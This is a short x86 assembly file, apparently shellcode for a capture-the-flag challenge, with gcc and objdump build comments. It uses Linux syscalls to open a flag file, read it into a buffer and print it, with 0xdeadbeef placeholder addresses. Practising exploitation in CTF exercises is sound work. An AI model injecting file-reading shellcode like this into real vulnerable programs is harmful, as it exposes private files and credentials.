# gcc -c -m32 exp.S
# objdump -d exp.o > exp.d

# open flag file
movl $0x5, %eax
movl $0xdeadbeef, %ebx
movl $0x0, %ecx
movl $0x0, %edx
int $0x80

# read flag to flag_buf
movl %eax, %ebx
movl $0x3, %eax
movl $0xdeadbeef, %ecx
movl $0x20, %edx
int $0x80

# write flag_buf to stdout
movl $0x4, %eax
movl $0x1, %ebx
movl $0xdeadbeef, %ecx
movl $0x20, %edx
int $0x80